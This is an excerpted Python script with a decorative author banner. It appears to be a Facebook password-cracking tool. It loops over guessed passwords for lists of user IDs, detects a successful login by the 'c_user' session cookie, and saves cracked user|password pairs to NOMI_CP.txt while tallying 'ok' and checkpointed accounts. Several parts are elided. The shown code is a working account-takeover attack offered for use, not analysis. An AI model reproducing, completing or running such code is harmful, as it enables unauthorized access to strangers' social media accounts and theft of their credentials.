...
\033[1;35m💙💘✨____________💞💕❣️____________💘💝💕💓
  ...
  Auther   : NOM KING & ARAIN
  \033[1;37mFacebook : JUTTKING
  \033[1;36mYoutube  : ABI BNAO GA
...
def hasil(OK,cp):
	...
	if len(cp) != 0:
	    ...
	    input("\x1b[1;97mPress enter to back NOMI Menu ")
	    mr()
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r \x1b[1;97m[NOMI] {loop}|{len(self.id)} \033[1;32m[ok][{len(ok)}] \033[1;31m[cp][{len(cp)}] ")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    try:
                        ...
                        print('\r%s [NOMI-CP] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('NOMI_CP.txt' , 'a').write('%s\n' % wrt)
                        break
